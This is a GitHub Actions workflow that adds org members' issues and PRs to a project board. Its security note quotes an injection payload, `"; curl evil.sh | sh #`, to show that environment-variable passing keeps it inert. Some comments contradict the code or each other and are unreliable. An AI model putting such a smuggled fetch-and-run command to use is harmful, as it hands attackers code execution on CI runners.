# .github/workflows/add-to-project.yml
#
# Adds newly opened issues and pull requests in this repository to the
# .gov Product Board: https://github.com/orgs/cisagov/projects/26
#
# Replaces the built-in "Auto-add to project" workflow, which is limited to one
# repository on the free plan (that slot is used by cisagov/manage.get.gov).
#
# Authenticates as a GitHub App installed on the cisagov org. The App's private
# key is the only long-lived credential. The token this workflow uses is minted
# per run, lives at most one hour, and is revoked automatically when the job
# ends. Setup, permissions and key rotation are documented in the wiki:
# https://github.com/cisagov/get.gov/wiki/project-board-automation

# EDITING THIS FILE
# `pull_request` runs the workflow file from a PR head, not from `main`. Changes
# you push to a branch take effect on that branch's runs immediately: the job
# executes with the App token and writes to the .gov Project board even before the
# PR is reviewed.
#
# Iterating on this file isn't a dry run when it's pushed to a branch. This allows for
# better testing of changes to this file. Since this only affects items being added to 
# the Project board and the App tokens are tightly scoped, this is okay. Just know
# that if something is added to the Project when it runs from a branch, you may
# need to manually remove them from the project afterward.
# SECURITY NOTE FOR REVIEWERS
# ---------------------------
# This workflow holds credentials and is triggerable by anyone on the internet,
# because anyone can open an issue on a public repository and the `issues` event
# runs with secrets available. It is safe ONLY because it never executes
# anything it did not ship with, and never interpolates attacker-controlled
# strings. If you edit this file, preserve all three invariants:
#
#   1. No `actions/checkout` and no execution of anything from a PR branch.
#   2. No `${{ github.event.* }}` interpolation inside a `run:` block. Values
#      reach the shell through `env:` only, so an issue title of
#      `"; curl evil.sh | sh #` is inert.
#   3. Only GitHub-generated fields are read (`node_id`), never user-authored
#      text.
#
# `pull_request` is used rather than `pull_request_target`, and PRs from forks
# are skipped by the job-level `if:` below. Fork PRs do not receive secrets on
# `pull_request`, so without the guard every community PR would produce a red
# failed run. `pull_request_target` would make them work, but it is the trigger
# with the worst footgun reputation in Actions and it is not worth adopting for
# a board convenience.
#
# `.github/workflows/` should carry a CODEOWNERS entry so changes here require
# security review.

name: Add new issues and PRs to the .gov Product Board

on:
  issues:
    # `transferred` is intentionally omitted: on transfer the item receives a
    # new node ID in the destination repo, and it is unverified whether the
    # event fires here with the old or the new ID. Add it only after testing.
    types: [opened, reopened]

  # Not pull_request_target -- see the security note above. Fork PRs are
  # filtered out by the job-level `if:` rather than failing noisily.
  pull_request:
    types: [opened, reopened]

  # Manual path: add an existing issue or PR by number (backfill, or smoke-test
  # the App credentials without opening a throwaway issue).
  workflow_dispatch:
    inputs:
      item_number:
        description: "Existing issue or PR number in this repo (must be authored by a cisagov member)"
        required: true
        type: string

  # Reconciliation sweep. Event-driven adds fail silently in practice -- an
  # expired key, a GitHub incident, or a rate limit drops items on the floor
  # with nobody watching the Actions tab. This re-adds anything from the last
  # week; the mutation is idempotent, so re-adds are free.
  schedule:
    - cron: "17 6 * * 1"

# The automatic GITHUB_TOKEN cannot read or write organization-level ProjectsV2,
# so it is not used at all. Zeroing this block also drops the default
# GITHUB_TOKEN permission set, which this workflow has no use for.
permissions: {}

env:
  # Node ID of the .gov Product Board (org project 26). Hardcoded rather
  # than looked up each run: it never changes, and a lookup is one more network
  # call that can fail. Re-derive it with:
  #   gh api graphql -f query='{organization(login:"cisagov"){projectV2(number:26){id}}}'
  PROJECT_ID: "PVT_kwDOARrkq84AEeXk"

jobs:
  add-to-project:
    name: Add item to the board
    # the behaviour of preinstalled tooling underneath this workflow.
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    # Skip PRs opened from a fork: they do not receive secrets on
    # `pull_request`, so the token step would fail and leave a red run on every
    # outside contribution. Issues are unaffected -- they always run in this
    # repository with secrets, whoever opened them.
    #
    # Author filtering is NOT done here. It needs an API call, so it lives in
    # the collect step below. Do not be tempted to move it back up here using
    # `github.event.issue.author_association`: that field reports members with
    # private org membership as CONTRIBUTOR, identical to an outside
    # contributor, and an earlier version of this workflow silently dropped
    # every such member's items. The collect step explains the fix.
    if: >-
      github.event_name != 'pull_request' ||
      github.event.pull_request.head.repo.full_name == github.repository

    steps:
      # Mints a short-lived installation token and revokes it in its post step.
      # The token cannot exceed the App's own permissions, which are three
      # read/write grants -- see the runbook.
      #
      # Pinned to a full commit SHA. Dependabot bumps the SHA and rewrites the
      # trailing version comment; never replace the SHA with a floating tag.
      - name: Mint a short-lived App token
        id: token
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ vars.PROJECT_BOT_APP_ID }}
          private-key: ${{ secrets.PROJECT_BOT_PRIVATE_KEY }}
          owner: ${{ github.repository_owner }}
          # Scope the token to this repository alone. With `owner` set and
          # `repositories` empty, the action mints a token for EVERY repository
          # in the App's installation -- so the token would silently widen the
          # moment a second repository is added to the installation.
          #
          # Use `github.repository` ("owner/name"), NOT
          # `github.event.repository.name`. The scheduled event carries no
          # webhook payload at all, so `github.event.repository` is undefined on
          # the weekly sweep: the input would resolve to an empty string, the
          # action would treat `repositories` as unset, and the sweep would fall
          # back to an all-repositories token -- on the one run nobody watches.
          # The `github` context is populated on every event type.
          #
          # The owner portion must match the `owner` input above.
          repositories: ${{ github.repository }}

      - name: Collect the node IDs to add
        env:
          GH_TOKEN: ${{ steps.token.outputs.token }}
          EVENT_NAME: ${{ github.event_name }}
          EVENT_ISSUE_ID: ${{ github.event.issue.node_id }}
          EVENT_ISSUE_AUTHOR: ${{ github.event.issue.user.login }}
          EVENT_PR_ID: ${{ github.event.pull_request.node_id }}
          EVENT_PR_AUTHOR: ${{ github.event.pull_request.user.login }}
          INPUT_NUMBER: ${{ inputs.item_number }}
          REPO: ${{ github.repository }}
          ORG: ${{ github.repository_owner }}
        run: |
          set -euo pipefail
          : > ids.txt

          # Logins that are not org members but whose items should still reach
          # the board, space-separated. Empty by default. Add "dependabot[bot]"
          # here if you want dependency PRs tracked on the board.
          ALLOWED_BOTS="dependabot[bot]"

          # Asks GitHub whether a login is a cisagov member.
          #
          # This API call is the entire reason the App needs
          # `Organization -> Members: Read-only`. The obvious alternative --
          # the webhook's own `author_association` field -- CANNOT answer this
          # question: a member whose organization visibility is set to private
          # is reported as CONTRIBUTOR, which is also what an outside person
          # gets once anything of theirs has been merged. The two are
          # indistinguishable in the payload. This endpoint checks membership
          # "publicly or privately" and is the only reliable signal.
          #
          # 204 = member, 404 = not a member. Anything else is a
          # misconfiguration rather than a "no" -- notably 302, which means the
          # caller is not seen as an org member at all -- so fail loudly
          # instead of silently dropping every item on the floor.
          is_member() {
            local login="$1" status b
            case "$login" in
              ''|*[!A-Za-z0-9._\[\]-]*)
                echo "::warning::Skipping malformed login: ${login}"
                return 1
                ;;
            esac
            for b in $ALLOWED_BOTS; do
              [ "$login" = "$b" ] && return 0
            done
            status="$(curl -sS -o /dev/null -w '%{http_code}' \
              -H "Authorization: Bearer ${GH_TOKEN}" \
              -H "Accept: application/vnd.github+json" \
              -H "X-GitHub-Api-Version: 2022-11-28" \
              "https://api.github.com/orgs/${ORG}/members/${login}")"
            case "$status" in
              204) return 0 ;;
              404) return 1 ;;
              *)
                echo "::error::Unexpected HTTP ${status} checking ${ORG} membership for ${login}. Verify the App still has Organization > Members: Read-only."
                exit 1
                ;;
            esac
          }

          case "$EVENT_NAME" in
            # The webhook payload carries the node ID, so the hot path costs
            # exactly one API call: the membership check.
            issues)
              if [ -z "$EVENT_ISSUE_ID" ]; then
                echo "::error::Issue payload carried no node_id."
                exit 1
              fi
              if is_member "$EVENT_ISSUE_AUTHOR"; then
                echo "$EVENT_ISSUE_ID" >> ids.txt
              else
                echo "::notice::${EVENT_ISSUE_AUTHOR} is not a ${ORG} member -- not added to the board."
              fi
              ;;
            pull_request)
              if [ -z "$EVENT_PR_ID" ]; then
                echo "::error::Pull request payload carried no node_id."
                exit 1
              fi
              if is_member "$EVENT_PR_AUTHOR"; then
                echo "$EVENT_PR_ID" >> ids.txt
              else
                echo "::notice::${EVENT_PR_AUTHOR} is not a ${ORG} member -- not added to the board."
              fi
              ;;
            workflow_dispatch)
              # Deliberately NOT membership-filtered. An operator naming an item
              # by hand has already made the decision, and a silent no-op during
              # The member check applies here too. There is no operator
              # override: an item from a non-member must not reach the board by
              # any route, including a deliberate manual dispatch. A refusal is
              # a hard error rather than a quiet no-op, so an operator who asked
              # for a specific number gets a clear answer instead of silence.
              #
              # INPUT_NUMBER is operator-supplied free text that ends up in an
              # API request, so reject anything that is not a bare integer.
              case "$INPUT_NUMBER" in
                ''|*[!0-9]*) echo "::error::item_number must be a positive integer, got: ${INPUT_NUMBER}"; exit 1 ;;
              esac
              # issueOrPullRequest resolves either kind in one call, so there is
              # no need to detect which it is first.
              gh api graphql -f query='
                query($owner: String!, $name: String!, $number: Int!) {
                  repository(owner: $owner, name: $name) {
                    issueOrPullRequest(number: $number) {
                      ... on Issue { id author { login } }
                      ... on PullRequest { id author { login } }
                    }
                  }
                }' \
                -f owner="${REPO%/*}" -f name="${REPO#*/}" -F number="$INPUT_NUMBER" \
                --jq '.data.repository.issueOrPullRequest
                      | [.id, (.author.login // "")]
                      | @tsv' > dispatch.tsv

              dispatch_id="$(cut -f1 dispatch.tsv)"
              dispatch_author="$(cut -f2 dispatch.tsv)"
              if [ -z "$dispatch_id" ] || [ "$dispatch_id" = "null" ]; then
                echo "::error::No issue or pull request numbered ${INPUT_NUMBER} in ${REPO}."
                exit 1
              fi
              if is_member "$dispatch_author"; then
                echo "$dispatch_id" >> ids.txt
              else
                echo "::error::#${INPUT_NUMBER} was opened by ${dispatch_author:-an unknown account}, who is not a ${ORG} member. Refusing to add it to the board."
                exit 1
              fi
              ;;
            schedule)
              # Everything created in the last eight days. The window overlaps
              # the weekly cadence because search is eventually consistent.
              #
              # The sweep MUST apply the same filters as the event path, or it
              # silently re-adds every item the event path rejected. Two of
              # them: isCrossRepository drops fork PRs (issues have no such
              # field, so `!= true` keeps them), and membership is checked
              # below. Authors are deduplicated first so a week of issues from
              # four people costs four calls, not forty.
              gh api graphql -f query='
                query($q: String!) {
                  search(query: $q, type: ISSUE, first: 100) {
                    nodes {
                      ... on Issue { id author { login } }
                      ... on PullRequest { id author { login } isCrossRepository }
                    }
                  }
                }' \
                -f q="repo:${REPO} created:>=$(date -u -d '8 days ago' +%Y-%m-%d)" \
                --jq '.data.search.nodes[]
                      | select(.isCrossRepository != true)
                      | [.id, (.author.login // "")]
                      | @tsv' > pairs.tsv

              cut -f2 pairs.tsv | sort -u | grep -v '^$' > authors.txt || true
              : > members.txt
              while read -r author; do
                if is_member "$author"; then
                  echo "$author" >> members.txt
                fi
              done < authors.txt

              while IFS="$(printf '\t')" read -r id author; do
                [ -n "$author" ] || continue
                if grep -qxF "$author" members.txt; then
                  echo "$id" >> ids.txt
                fi
              done < pairs.tsv
              ;;
            *)
              echo "::error::Unsupported event: ${EVENT_NAME}"
              exit 1
              ;;
          esac

          sed -i '/^$/d; /^null$/d' ids.txt
          echo "Resolved $(wc -l < ids.txt) item(s) to add."

      - name: Add the items to the board
        env:
          GH_TOKEN: ${{ steps.token.outputs.token }}
        run: |
          set -euo pipefail
          if [ ! -s ids.txt ]; then
            echo "Nothing to add."
            exit 0
          fi
          failed=0
          while read -r content_id; do
            # addProjectV2ItemById is idempotent: if the item is already on the
            # board, the existing item ID comes back instead of a duplicate.
            if item_id="$(gh api graphql -f query='
                mutation($project: ID!, $content: ID!) {
                  addProjectV2ItemById(input: {projectId: $project, contentId: $content}) {
                    item { id }
                  }
                }' \
              -f project="$PROJECT_ID" -f content="$content_id" \
              --jq '.data.addProjectV2ItemById.item.id')"; then
              echo "ok  ${content_id} -> ${item_id}"
            else
              echo "::warning::Failed to add ${content_id}"
              failed=$((failed + 1))
            fi
          done < ids.txt
          if [ "$failed" -gt 0 ]; then
            echo "::error::${failed} item(s) could not be added."
            exit 1
          fi
          echo "Added $(wc -l < ids.txt) item(s) to the .gov Product Board." >> "$GITHUB_STEP_SUMMARY"
